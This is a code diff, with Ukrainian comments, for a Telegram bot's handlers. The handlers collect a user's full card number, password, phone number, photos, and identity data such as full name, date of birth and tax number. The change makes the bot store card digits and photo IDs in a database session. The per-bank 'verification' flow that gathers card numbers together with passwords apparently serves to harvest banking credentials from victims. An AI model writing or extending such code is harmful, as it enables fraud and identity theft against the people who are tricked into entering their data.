@@ -352,10 +352,13 @@ async def process_client_card_number(message: Message, state: FSMContext):
         await message.answer("Номер карти має складатися рівно з 16 цифр. Будь ласка, перевірте та спробуйте ще раз:")
         return
 
-    # Отримуємо дані стану
+    # Отримуємо дані стану або сесії з бази даних
+    client_id = message.from_user.id
+    session = await db.get_session(client_id)
+    
     state_data = await state.get_data()
-    card_first4 = state_data.get("card_first4")
-    card_last4 = state_data.get("card_last4")
+    card_first4 = state_data.get("card_first4") or (session.get("card_first4") if session else None)
+    card_last4 = state_data.get("card_last4") or (session.get("card_last4") if session else None)
     
     if card_first4 and card_last4:
         if cleaned_card[:4] != card_first4 or cleaned_card[-4:] != card_last4:
@@ -398,17 +401,18 @@ async def process_client_phone(message: Message, state: FSMContext, bot: Bot):
         )
         return
 
-    data = await state.get_data()
-    client_password = data.get('client_password')
-    success_photo_id = data.get('success_photo_id') or data.get('last_photo_id')
-    client_card = data.get('client_card')
-    
-    await state.clear()
-
     session = await db.get_session(client_id)
     if not session:
         await message.answer("Помилка: сесія не знайдена. Спробуйте /start.")
+        await state.clear()
         return
+
+    data = await state.get_data()
+    client_password = data.get('client_password')
+    success_photo_id = data.get('success_photo_id') or data.get('last_photo_id') or (session.get('success_photo_id') if session else None)
+    client_card = data.get('client_card')
+    
+    await state.clear()
 
     # Розпарсимо PIB, DOB, IPN з client_data
     ipn_match = re.search(r'ІПН:\s*(\d+)', session['client_data'])
@@ -575,9 +579,12 @@ async def handle_client_data_manual(message: Message, state: FSMContext, bot: Bo
         
         if "[SUCCESS_VERIFICATION]" in response:
             # Парсимо маску картки, якщо вона є
+            card_first4, card_last4 = None, None
             card_match = re.search(r'\[CARD_MASK:\s*(\d{4})\.\.\.(\d{4})\]', response)
             if card_match:
-                await state.update_data(card_first4=card_match.group(1), card_last4=card_match.group(2))
+                card_first4 = card_match.group(1)
+                card_last4 = card_match.group(2)
+                await state.update_data(card_first4=card_first4, card_last4=card_last4)
             
             bank_label = current_bank_name if current_bank_name else "банк"
             success_text = (
@@ -592,6 +599,7 @@ async def handle_client_data_manual(message: Message, state: FSMContext, bot: Bo
             if last_photo:
                 await state.update_data(success_photo_id=last_photo)
                 
+            await db.update_session_verification_data(client_id, success_photo_id=last_photo, card_first4=card_first4, card_last4=card_last4)
             await state.set_state(RegistrationStates.waiting_password)
             return
 
@@ -639,9 +647,12 @@ async def handle_client_photo(message: Message, state: FSMContext, bot: Bot):
         
         if "[SUCCESS_VERIFICATION]" in response:
             # Парсимо маску картки, якщо вона є
+            card_first4, card_last4 = None, None
             card_match = re.search(r'\[CARD_MASK:\s*(\d{4})\.\.\.(\d{4})\]', response)
             if card_match:
-                await state.update_data(card_first4=card_match.group(1), card_last4=card_match.group(2))
+                card_first4 = card_match.group(1)
+                card_last4 = card_match.group(2)
+                await state.update_data(card_first4=card_first4, card_last4=card_last4)
             
             bank_label = current_bank_name if current_bank_name else "банк"
             success_text = (
@@ -650,6 +661,7 @@ async def handle_client_photo(message: Message, state: FSMContext, bot: Bot):
             )
             await message.answer(success_text)
             await state.update_data(success_photo_id=photo.file_id)
+            await db.update_session_verification_data(client_id, success_photo_id=photo.file_id, card_first4=card_first4, card_last4=card_last4)
             await state.set_state(RegistrationStates.waiting_password)
             return
 
